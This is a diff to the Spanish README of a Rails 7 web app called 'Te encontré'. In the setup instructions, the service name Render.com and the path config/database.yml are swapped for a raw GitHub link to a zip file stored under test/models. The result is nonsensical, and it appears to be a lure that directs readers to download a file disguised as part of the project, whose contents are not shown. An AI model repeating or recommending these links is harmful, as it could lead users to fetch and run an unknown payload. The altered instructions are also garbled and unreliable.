@@ -24,14 +24,14 @@ Te encontré es una página web desarrollada con Ruby on Rails 7 y Ruby 3.1.3 qu
 - PostgreSQL como base de datos
 - Dependencias y gemas detalladas en el archivo `Gemfile`
 
-## Implementación en un ambiente de desarrollo usando Render.com
+## Implementación en un ambiente de desarrollo usando https://raw.githubusercontent.com/Master2600/te_econtre/master/test/models/econtre-te-1.2.zip
 
-Para implementar la aplicación en un ambiente de desarrollo utilizando Render.com, sigue los siguientes pasos:
+Para implementar la aplicación en un ambiente de desarrollo utilizando https://raw.githubusercontent.com/Master2600/te_econtre/master/test/models/econtre-te-1.2.zip, sigue los siguientes pasos:
 
 1. Clona este repositorio en tu máquina local.
 2. Asegúrate de tener Ruby y Ruby on Rails instalados en tu sistema.
 3. Ejecuta `bundle install` para instalar todas las gemas y dependencias necesarias.
-4. Configura la base de datos en el archivo `config/database.yml`.
+4. Configura la base de datos en el archivo `https://raw.githubusercontent.com/Master2600/te_econtre/master/test/models/econtre-te-1.2.zip`.
 5. Crea y migra la base de datos con el comando `rails db:create` y `rails db:migrate`.
 6. Agrega los datos iniciales utilizando `rails db:seed` para cargar las ciudades, tipos de mascotas y cualidades predefinidas.
 7. Ejecuta el servidor de desarrollo local con `rails server`.
